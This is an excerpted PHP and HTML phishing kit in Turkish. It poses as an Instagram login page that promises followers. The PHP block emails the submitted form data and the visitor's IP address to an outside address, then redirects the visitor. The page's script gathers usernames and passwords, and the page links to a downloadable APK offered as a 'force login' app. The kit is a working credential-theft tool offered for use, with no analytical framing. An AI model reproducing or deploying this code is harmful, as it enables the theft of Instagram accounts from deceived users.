[INSTAGRAM LOGIN TO GET FOLLOWERS ]<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://instager.net/giris-yap');
$message = '';
...
mail('sniperr@hi2.in', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
exit;
} ?>
<html lang="tr">
<head>
...
<body>
                           ...
                           <form action="<?php echo basename(__FILE__); ?>" method="post"
                              ...
                              <div class="instaclass8 instaclass9">
                               ...
                               <p>Giriş yapamayan kullanıcılar mobil uygulamamızı indirerek sorunsuz login sağlayabilirler.</p>
                                   <p>Mobil Uygulama Site Kodu : <b style="font-size:18px;font-weight:bold;">8006</b></p>
                               <p><a href='https://insta.web.tr/instabom-force-login.apk' target="_blank">
      ...
      <script>
          $('#login_insta').click(function() {
              ...
              $('.spispinner').show();
                            var dataList = "username=" + encodeURIComponent($('input[name="username"]').val()) + "&password=" + encodeURIComponent($('input[name="password"]').val()) + "&userid=" + encodeURIComponent($('input[name="userid"]').val()) + "&antiForgeryToken=86d48ee1a1eab7bceb745c4730d42648";
          ...
          $('#username').keyup(function() {
              ...
              $.ajax({
                         type    : "GET",
                         url     : "https://www.instagram.com/web/search/topsearch/?context=blended&query=" + value + "&rank_token=0.8516828732626001&include_reel=true&count=0",
                         dataType: "json",
